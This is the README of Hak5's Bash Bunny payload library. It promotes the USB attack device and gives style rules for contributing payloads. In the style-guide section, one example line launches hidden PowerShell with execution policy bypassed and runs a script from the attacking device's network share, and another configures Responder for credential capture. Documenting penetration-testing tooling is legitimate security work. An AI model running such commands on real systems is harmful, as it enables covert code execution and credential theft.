# Payload Library for the [Bash Bunny](https://shop.hak5.org/products/bash-bunny) by [Hak5](https://hak5.org)

This repository contains payloads and extensions for the Hak5 Bash Bunny. Community developed payloads are listed and developers are encouraged to create pull requests to make changes to or submit new payloads.

**Payloads here are written in official DuckyScript™ and Bash specifically for the Bash Bunny. Hak5 does NOT guarantee payload functionality.** <a href="#legal"><b>See Legal and Disclaimers</b></a>

<div align="center">
<img src="https://img.shields.io/github/forks/hak5/bashbunny-payloads?style=for-the-badge"/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img src="https://img.shields.io/github/stars/hak5/bashbunny-payloads?style=for-the-badge"/>
<br/>
<img src="https://img.shields.io/github/commit-activity/y/hak5/bashbunny-payloads?style=for-the-badge">
<img src="https://img.shields.io/github/contributors/hak5/bashbunny-payloads?style=for-the-badge">
</div>
<br/>
<p align="center">
<a href="https://payloadhub.com"><img src="https://cdn.shopify.com/s/files/1/0068/2142/files/payloadhub.png?v=1652474600"></a>
<br/>
<a href="https://payloadhub.com/blogs/payloads/tagged/bash-bunny">View Featured Bash Bunny Payloads and Leaderboard</a>
<br/><i>Get your payload in front of thousands. Enter to win over $2,000 in prizes in the <a href="https://hak5.org/pages/payload-awards">Hak5 Payload Awards!</a></i>
</p>

<div align="center">
<a href="https://hak5.org/discord"><img src="https://img.shields.io/discord/506629366659153951?label=Hak5%20Discord&style=for-the-badge"></a>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a href="https://youtube.com/hak5"><img src="https://img.shields.io/youtube/channel/views/UC3s0BtrBJpwNDaflRSoiieQ?label=YouTube%20Views&style=for-the-badge"/></a>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a href="https://youtube.com/hak5"><img src="https://img.shields.io/youtube/channel/subscribers/UC3s0BtrBJpwNDaflRSoiieQ?style=for-the-badge"/></a>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a href="https://twitter.com/hak5"><img src="https://img.shields.io/badge/follow-%40hak5-1DA1F2?logo=twitter&style=for-the-badge"/></a>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a href="https://instagram.com/hak5gear"><img src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white"/></a>
<br/><br/>

</div>


# Table of contents
<details open>
<ul>
<li><a href="#about-the-bash-bunny">About the Bash Bunny</a></li>
<li><a href="#build-your-payloads-with-payloadstudio">PayloadStudio (Editor + Compiler)</a></li>
<li><b><a href="#contributing">Contributing Payloads</a></b></li>
<li><a href="#legal"><b>Legal and Disclaimers</b></a></li>
</ul> 
</details>


## Shop
- [Bash Bunny Mark II](https://shop.hak5.org/products/bash-bunny "Purchase the Bash Bunny")
- [PayloadStudio Pro](https://hak5.org/products/payload-studio-pro "Purchase PayloadStudio Pro")
- [Shop All Hak5 Tools](https://shop.hak5.org "Shop All Hak5 Tools")
## Getting Started
- [Build Payloads with PayloadStudio](#build-your-payloads-with-payloadstudio) | [Getting STARTED](https://docs.hak5.org/bash-bunny/beginner-guides/ "QUICK START GUIDE") | [Your First Payload](https://docs.hak5.org/bash-bunny/writing-payloads/payload-development-basics)
## Documentation / Learn More
-   [Documentation](https://docs.hak5.org/bash-bunny/ "Documentation") 

## Community
*Got Questions? Need some help? Reach out:*
-  [Discord](https://hak5.org/discord/ "Discord") | [Forums](https://forums.hak5.org/forum/92-bash-bunny/ "Forums")


## Additional Links
<b> Follow the creators </b><br/>
<p>
	<b>Korben's Socials</b><br/>	
	<a href="https://twitter.com/notkorben"><img src="https://img.shields.io/twitter/follow/notkorben?style=social"/></a>  
	<a href="https://instagram.com/hak5korben"><img src="https://img.shields.io/badge/Instagram-Follow%20@hak5korben-E1306C"/></a>
<br/>
	<b>Darren's Socials</b><br/>
	<a href="https://twitter.com/hak5darren"><img src="https://img.shields.io/twitter/follow/hak5darren?style=social"/></a>  
	<a href="https://instagram.com/hak5darren"><img src="https://img.shields.io/badge/Instagram-Follow%20@hak5darren-E1306C"/></a>
</p>

<br/>
<h1><a href="https://shop.hak5.org/products/bash-bunny">About the Bash Bunny</a></h1>

Linux machine in a USB. By emulating combinations of trusted USB devices — like gigabit Ethernet, serial, flash storage and keyboards — the Bash Bunny tricks computers into divulging data, exfiltrating documents, installing backdoors and many more exploits. 


<b><div align="center">
	<br/>
<br/><br/>
</div></b>

<p align="center">
  <a href="https://www.youtube.com/watch?v=-UmvZdDxCiI">
    <img src="https://downloads.hak5.org/assets/images/productphotos/bash_bunny_mk2.png" width="500"/>
  </a>
  <br/>
</p>


<p align="center">
    <img src="https://cdn.shopify.com/s/files/1/0068/2142/files/bb_icon3_160x160.png?v=1624506236" alt="image">
</p>

## <div align="center">ADVANCED ATTACKS </div>

For the sake of convenience, computers trust a number of devices. Flash drives, Ethernet adapters, serial devices and keyboards to name a few. These have become mainstays of modern computing. Each has their own unique attack vectors. When combined? The possibilities are limitless. The Bash Bunny is all of these things, alone – or in combination – and more!

<p align="center">
    <img src="https://cdn.shopify.com/s/files/1/0068/2142/files/bb_icon2_160x160.png?v=1624506369" alt="image">
</p>

## <div align="center">SIMPLE PAYLOADS </div>

Each attack, or payload, is written in a simple Ducky Script™ language consisting of text files. This repository is home to a growing library of community developed payloads. Staying up to date with all of the latest attacks is just a matter of downloading files from git. Then loading ’em onto the Bash Bunny just as you would any ordinary flash drive.

<p align="center">
    <img src="https://cdn.shopify.com/s/files/1/0068/2142/files/bb_icon1_160x160.png?v=1624506437" alt="image">
</p>

## <div align="center">SIMPLE POWERFUL HARDWARE </div>

It's a full featured Linux box that'll run your favorite tools even faster now thanks to the optimized quad-core CPU, desktop-class SSD and doubled RAM. Choose and monitor payloads with the selection switch and RGB LED. Access an unlocked root terminal via dedicated Serial console. Exfiltrate gigs of loot via MicroSD. Even remotely trigger or geofence payloads via Bluetooth.


<h1><a href="https://payloadstudio.hak5.org">Build your payloads with PayloadStudio</a></h1>
<p align="center">
Take your DuckyScript™ payloads to the next level with this full-featured,<b> web-based (entirely client side) </b> development environment.
<br/>
<a href="https://payloadstudio.hak5.org"><img width="500px" src="https://cdn.shopify.com/s/files/1/0068/2142/products/payload-studio-icon_2000x.png"></a>
<br/>
<i>Payload studio features all of the conveniences of a modern IDE, right from your browser. From syntax highlighting and auto-completion to live error-checking and repo synchronization - building payloads for Hak5 hotplug tools has never been easier!
<br/><br/>
Supports your favorite Hak5 gear - USB Rubber Ducky, Bash Bunny, Key Croc, Shark Jack, Packet Squirrel & LAN Turtle!
<br/><br/></i><br/>
<a href="https://hak5.org/products/payload-studio-pro">Become a PayloadStudio Pro</a> and <b> Unleash your hacking creativity! </b>
<br/>
OR
<br/>
<a href="https://payloadstudio.hak5.org/community/"> Try Community Edition FREE</a> 
<br/><br/>
<img src="https://cdn.shopify.com/s/files/1/0068/2142/files/themes1_1_600x.gif?v=1659642557">
<br/>
<i> Payload Studio Themes Preview GIF </i>
<br/><br/>
<img src="https://cdn.shopify.com/s/files/1/0068/2142/files/AUTOCOMPLETE3_600x.gif?v=1659640513">
<br/>
<i> Payload Studio Autocomplete Preview GIF </i>
</p>


## Disclaimer
Generally, payloads may execute commands on your device. As such, it is possible for a payload to damage your device. Payloads from this repository are provided AS-IS without warranty. While Hak5 makes a best effort to review payloads, there are no guarantees as to their effectiveness. As with any script, you are advised to proceed with caution.

<h1><a href='https://payloadhub.com'>Contributing</a></h1>

<p align="center">
<a href="https://payloadhub.com"><img src="https://cdn.shopify.com/s/files/1/0068/2142/files/payloadhub.png?v=1652474600"></a>
<br/>
<a href="https://payloadhub.com">View Featured Payloads and Leaderboard </a>
</p>

# Please adhere to the following best practices and style guides when submitting a payload.

Once you have developed your payload, you are encouraged to contribute to this repository by submitting a Pull Request. Reviewed and Approved pull requests will add your payload to this repository, where they may be publically available.

Please include all resources required for the payload to run. If needed, provide a README.md in the root of your payload's directory to explain things such as intended use, required configurations, or anything that will not easily fit in the comments of the payload.txt itself. Please make sure that your payload is tested, and free of errors. If your payload contains (or is based off of) the work of other's please make sure to cite their work giving proper credit. 


### Purely Destructive payloads will not be accepted. No, it's not "just a prank".
Subject to change. Please ensure any submissions meet the [latest version](https://github.com/hak5/usbrubberducky-payloads/blob/master/README.md) of these standards before submitting a Pull Request.



## Naming Conventions
Please give your payload a unique, descriptive and appropriate name. Do not use spaces in payload, directory or file names. Each payload should be submit into its own directory, with `-` or `_` used in place of spaces, to one of the categories such as exfiltration, phishing, remote_access or recon. Do not create your own category.

## Staged Payloads
"Staged payloads" are payloads that **download** code from some resource external to the payload.txt. 

While staging code used in payloads is often useful and appropriate, using this (or another) github repository as the means of deploying those stages is not. This repository is **not a CDN for deployment on target systems**. 

Staged code should be copied to and hosted on an appropriate server for doing so **by the end user** - Github and this repository are simply resources for sharing code among developers and users.
See: [GitHub acceptable use policies](https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies#5-site-access-and-safety)

Additionally, any source code that is intended to be staged **(by the end user on the appropriate infrastructure)** should be included in any payload submissions either in the comments of the payload itself or as a seperate file. **Links to staged code are unacceptable**; not only for the reasons listed above but also for version control and user safety reasons. Arbitrary code hidden behind some pre-defined external resource via URL in a payload could be replaced at any point in the future unbeknownst to the user -- potentially turning a harmless payload into something dangerous.

### Including URLs
URLs used for retrieving staged code should refer exclusively to **example.com** using a bash variable in any payload submissions [see Payload Configuration section below](https://github.com/hak5/usbrubberducky-payloads/blob/master/README.md#payload-configuration). 

### Staged Example

**Example scenario: your payload downloads a script and the executes it on a target machine.**
- Include the script in the directory with your payload
- Provide instructions for the user to move the script to the appropriate hosting service.
- Provide a bash variable with the placeholder example.com for the user to easily configure once they have hosted the script

[Simple Example of this style of payload](https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/exfiltration/Printer-Recon)

## Payload Configuration
Be sure to take the following into careful consideration to ensure your payload is easily tested, used and maintained.
In many cases, payloads will require some level of configuration **by the end payload user**. 

- Abstract configuration(s) for ease of use. Use bash assignment variables where possible. 
- Remember to use PLACEHOLDERS for configurable portions of your payload - do not share your personal URLs, API keys, Passphrases, etc...
- URLs to staged payloads SHOULD NOT BE INCLUDED. URLs should be replaced by example.com. Provide instructions on how to specific resources should be hosted on the appropriate infrastructure.
- Make note of both REQUIRED and OPTIONAL configuration(s) in your payload using bash comments at the top of your payload or "inline" where applicable.

```
Example: 
	BEGINNING OF PAYLOAD 
	... Payload Documentation... 

	# CONFIGURATION
	# REQUIRED - Provide URL used for Example
	MY_TARGET_URL="example.com"

	#  OPTIONAL - How long until payload starts; default 5s
	BOOT_DELAY="5000"

	QUACK DELAY $BOOT_DELAY
	...
	QUACK STRING $MY_TARGET_URL
	...
```

## Payload Documentation 
Payloads should begin with `#` bash comments specifying the title of the payload, the author, the target, and a brief description.

```
Example:
	BEGINNING OF PAYLOAD

	# Title: Example Payload
	# Author: Korben Dallas
	# Description: Opens hidden powershell and
	# Target: Windows 10
	# Props: Hak5, Darren Kitchen, Korben
	# Version: 1.0
	# Category: General
```


### Binaries
Binaries may not be accepted in this repository. If a binary is used in conjunction with the payload, please document where it or its source may be obtained.

   
### Configuration Options
Configurable options should be specified in variables at the top of the payload.txt file

    # Options
    RESPONDER_OPTIONS="-w -r -d -P"
    LOOTDIR=/root/udisk/loot/quickcreds

### LED
The payload should use common payload states rather than unique color/pattern combinations when possible with an LED command preceding the Stage or ATTACKMODE.

    # Initialization
    LED SETUP
    GET SWITCH_POSITION
    GET HOST_IP
    
    # Attack
    LED ATTACK
    ATTACKMODE HID ECM_ETHERNET

### Stages and States
Stages should be documented with comments

    # Keystroke Injection Stage
    # Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available
    GET HOST_IP
    LED STAGE1
    ATTACKMODE HID
    RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If (Test-Connection $HOST_IP -count 1) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""

Common payload states include a `SETUP`, with may include a `FAIL` if certain conditions are not met. This is typically followed by either a single `ATTACK` or multiple `STAGEs`. More complex payloads may include a `SPECIAL` function to wait until certain conditions are met. Payloads commonly end with a `CLEANUP` phase, such as moving and deleting files or stopping services. A payload may `FINISH` when the objective is complete and the device is safe to eject or turn off. These common payload states correspond to `LED` states.

<h1><a href="https://hak5.org/pages/policy">Legal</a></h1>

Payloads from this repository are provided for educational purposes only.  Hak5 gear is intended for authorized auditing and security analysis purposes only where permitted subject to local and international laws where applicable. Users are solely responsible for compliance with all laws of their locality. Hak5 LLC and affiliates claim no responsibility for unauthorized or unlawful use.

Bash Bunny and DuckyScript are the trademarks of Hak5 LLC. Copyright © 2010 Hak5 LLC. All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means without prior written permission from the copyright owner.
Bash Bunny and DuckyScript are subject to the Hak5 license agreement (https://hak5.org/license)
DuckyScript is the intellectual property of Hak5 LLC for the sole benefit of Hak5 LLC and its licensees. To inquire about obtaining a license to use this material in your own project, contact us. Please report counterfeits and brand abuse to legal@hak5.org.
This material is for education, authorized auditing and analysis purposes where permitted subject to local and international laws. Users are solely responsible for compliance. Hak5 LLC claims no responsibility for unauthorized or unlawful use.
Hak5 LLC products and technology are only available to BIS recognized license exception ENC favorable treatment countries pursuant to US 15 CFR Supplement No 3 to Part 740.

See also: 

[Hak5 Software License Agreement](https://shop.hak5.org/pages/software-license-agreement)
	
[Terms of Service](https://shop.hak5.org/pages/terms-of-service)

# Disclaimer
<h3><b>As with any script, you are advised to proceed with caution.</h3></b>
<h3><b>Generally, payloads may execute commands on your device. As such, it is possible for a payload to damage your device. Payloads from this repository are provided AS-IS without warranty. While Hak5 makes a best effort to review payloads, there are no guarantees as to their effectiveness.</h3></b>
